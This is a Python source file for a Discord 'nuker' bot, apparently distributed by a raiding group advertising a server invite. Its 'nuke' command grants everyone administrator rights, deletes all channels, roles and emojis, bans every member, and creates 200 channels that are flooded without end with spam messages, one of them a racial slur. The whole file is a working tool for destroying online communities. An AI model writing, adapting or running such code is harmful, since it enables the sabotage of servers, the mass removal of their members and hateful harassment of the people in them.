import os
import discord
from discord.ext import commands
import random
from discord import Permissions
from colorama import Fore, Style
import asyncio


prefix = input(f"Enter Prefix For Your Bot: ")


client = commands.Bot(command_prefix=prefix)


print('''\033[35m
      ~ made by SynixABI | @10a830
      ~ Rate limit Chance ~ 0%
      ~ discord.gg/47selling

        :::::::::           :::        :::::::::   :::::::::::    :::   :::       ::: 
       :+:    :+:        :+: :+:      :+:    :+:      :+:        :+:   :+:       :+:  
      +:+    +:+       +:+   +:+     +:+    +:+      +:+         +:+ +:+        +:+   
     +#++:++#+       +#++:++#++:    +#++:++#:       +#+          +#++:         +#+    
    +#+             +#+     +#+    +#+    +#+      +#+           +#+          +#+     
   #+#             #+#     #+#    #+#    #+#      #+#           #+#                   
  ###             ###     ###    ###    ###      ###           ###          ###     
    

''' + 
         
 
'''
''')
#Bot Token 
token = input(f"Enter Your Bot Token: ")
#enter Your User id like - Example#6969
owner = input(f"Enter Your Username With Tag [Example#6969]: ")



SPAM_CHANNEL = "PARTY NUKER RUNS DISCORD"
SPAM_MESSAGE = "@everyone SERVER GOT Nuked ","@everyone Cry About it","@everyone  discord.gg/47selling @everyone ","@everyone PARTY NUKER RUNS THIS DISCORD!","@everyone STUPID NIGGERS!"," @everyone FUCK ALL NAZIS! "

client = commands.Bot(command_prefix=prefix)

@client.event
async def on_ready():
 
   await client.change_presence(activity=discord.Streaming(name="Nuker by .gg/47selling", url="https://www.twitch.tv/47selling"))
   print("Logged in as " + client.user.name)

print('''\033[35m
''' + prefix + '''nuke for destroy!
''')
 
@client.command()
async def stop(ctx):
  await ctx.reply('> Log Out | Shut down successfully')
  await client.close()
@client.command()
async def nuke(ctx):
    await ctx.message.delete()
    guild = ctx.guild
    try:
      role = discord.utils.get(guild.roles, name = "everyone")
      await role.edit(permissions = Permissions.all())
      print(Fore.MAGENTA + "I have given everyone admin." + Fore.RESET)
    except:
      print(Fore.GREEN + "I was unable to give everyone admin" + Fore.RESET)
    for channel in guild.channels:
      try:
        await channel.delete()
        print(Fore.MAGENTA + f"{channel.name} was deleted." + Fore.RESET)
      except:
        print(Fore.GREEN + f"{channel.name} was NOT deleted." + Fore.RESET)
    for member in guild.members:
     try:
       await member.ban()
       print(Fore.MAGENTA + f"{member.name}#{member.discriminator} Was banned" + Fore.RESET)
     except:
       print(Fore.GREEN + f"{member.name}#{member.discriminator} Was unable to be banned." + Fore.RESET)
    for role in guild.roles:
     try:
       await role.delete()
       print(Fore.MAGENTA + f"{role.name} Has been deleted" + Fore.RESET)
     except:
       print(Fore.GREEN + f"{role.name} Has not been deleted" + Fore.RESET)
    for emoji in list(ctx.guild.emojis):
     try:
       await emoji.delete()
       print(Fore.MAGENTA + f"{emoji.name} Was deleted" + Fore.RESET)
     except:
       print(Fore.GREEN + f"{emoji.name} Wasn't Deleted" + Fore.RESET)
    banned_users = await guild.bans()
    for ban_entry in banned_users:
      user = ban_entry.user
      try:
        await user.unban(owner)
        print(Fore.MAGENTA + f"{user.name}#{user.discriminator} Was successfully unbanned." + Fore.RESET)
      except:
        print(Fore.GREEN + f"{user.name}#{user.discriminator} Was not unbanned." + Fore.RESET)
    await guild.create_text_channel(SPAM_CHANNEL)
    for channel in guild.text_channels:
        link = await channel.create_invite(max_age = 0, max_uses = 100)
        print(f"New Invite: {link}")
    amount = 200
    for i in range(amount):
       await guild.create_text_channel(SPAM_CHANNEL)
    print(f"nuked {guild.name} Successfully.")
    return

@client.event
async def on_guild_channel_create(channel):
  while True:
    await channel.send(random.choice(SPAM_MESSAGE))

client.run(token, bot=True)